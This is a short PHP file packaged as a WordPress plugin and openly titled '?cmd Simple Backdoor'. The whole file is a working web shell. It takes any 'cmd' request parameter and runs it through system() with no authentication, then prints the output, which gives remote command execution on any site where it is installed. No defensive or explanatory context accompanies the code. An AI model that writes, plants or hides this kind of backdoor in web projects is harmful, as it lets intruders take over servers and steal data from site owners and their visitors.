<?php

/**
* Plugin Name: ?cmd Simple Backdoor
* Plugin URI:
* Description: ?cmd Simple Backdoor
* Version: 1.0
* Author: Zed
* Author URI: http://github.com/zedek1
*/

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>